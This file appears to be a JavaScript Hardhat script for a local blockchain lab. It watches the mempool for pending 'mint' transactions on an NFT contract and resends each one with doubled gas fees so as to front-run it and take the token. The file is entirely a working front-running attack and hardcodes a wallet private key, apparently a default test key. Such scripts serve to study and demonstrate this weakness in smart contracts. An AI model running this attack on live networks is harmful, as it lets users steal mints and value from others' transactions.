const { ethers, deployments } = require("hardhat");
const FrontRunning = require('../artifacts/contracts/FrontRunning.sol/FrontContract.json')

async function frontRunningFn() {
    const provider = new ethers.JsonRpcProvider("http://127.0.0.1:8545");
    const privateKey = "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d"
    const myWallet = new ethers.Wallet(privateKey, provider)
    const RUNNINGABI = FrontRunning.abi;
    const contractAddr = "0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512"
    // const myContract = new ethers.Contract(contractAddr, RUNNINGABI, myWallet)
    //这里并不需要和钱包交互所以使用provider创建合约
    const myContract = new ethers.Contract(contractAddr, RUNNINGABI, provider)
    const myInterface = new ethers.Interface(RUNNINGABI)
    const mintHash = await myInterface.getFunction("mint").selector

    provider.on('pending', async function (txHash) {
        const tx = await provider.getTransaction(txHash)
        if (!tx) return
        const hasMint = tx.data.indexOf(mintHash)
        let newTokenId = await myContract._nextTokenId();
        const myTokenId = newTokenId - BigInt(1)
        if (hasMint === -1 || tx.from == myWallet.address) return
        const frontTx = {
            to: tx.to,
            value: tx.value,
            maxPriorityFeePerGas: tx.maxPriorityFeePerGas * 2n,
            maxFeePerGas: tx.maxFeePerGas * 2n,
            gasLimit: tx.gasLimit * 2n,
            data: tx.data
        }
        const sentFR = await myWallet.sendTransaction(frontTx)
        await sentFR.wait()

        const myOwner = await myContract.ownerOf(myTokenId)
        const newOwner = await myContract.ownerOf(newTokenId)
        console.log("myOwner", newTokenId, "\nnewOwner", myTokenId);
        console.log("myOwner", myOwner, "\nnewOwner", newOwner);
    })



}
frontRunningFn()